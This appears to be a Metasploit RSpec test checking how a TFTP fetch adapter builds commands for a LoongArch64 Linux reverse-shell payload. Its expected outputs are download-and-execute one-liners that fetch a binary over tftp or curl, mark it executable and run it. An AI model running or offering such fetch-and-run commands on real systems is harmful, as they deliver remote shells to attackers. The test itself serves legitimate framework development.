require 'spec_helper'

RSpec.describe 'cmd/linux/tftp/loongarch64' do
  include_context 'Msf::Simple::Framework#modules loading'

  subject(:payload) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/linux/tftp/loongarch64/shell_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/linux/tftp/loongarch64',
        'singles/linux/loongarch64/shell_reverse_tcp'
      ]
    )
  end

  before do
    payload.datastore.merge!(
      'LHOST' => '192.0.2.1', 'LPORT' => 4444, 'VERBOSE' => true,
      'FETCH_COMMAND' => 'TFTP', 'FETCH_SRVHOST' => '192.0.2.2',
      'FETCH_SRVPORT' => 69, 'FETCH_URIPATH' => 'payload'
    )
  end

  it 'uses the URI for the local TFTP filename without using destination options' do
    expect(payload.options).to include('FETCH_FILENAME', 'FETCH_WRITABLE_DIR')
    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_FILENAME'])).to be(false)
    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_WRITABLE_DIR'])).to be(false)
    expect(payload.options.validate(payload.datastore)).to be(true)
    expect(payload.generate).to eq('(echo binary ; echo get payload ) | tftp 192.0.2.2; chmod +x ./payload; ./payload &')
  end

  it 'uses destination options for curl TFTP fetches' do
    payload.datastore.merge!(
      'FETCH_COMMAND' => 'CURL', 'FETCH_FILENAME' => 'stored_payload',
      'FETCH_WRITABLE_DIR' => '/tmp'
    )

    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_FILENAME'])).to be(true)
    expect(Msf::OptCondition.show_option(payload, payload.options['FETCH_WRITABLE_DIR'])).to be(true)
    expect(payload.generate).to eq('curl -so /tmp/stored_payload tftp://192.0.2.2:69/payload;chmod +x /tmp/stored_payload;/tmp/stored_payload&')
  end
end
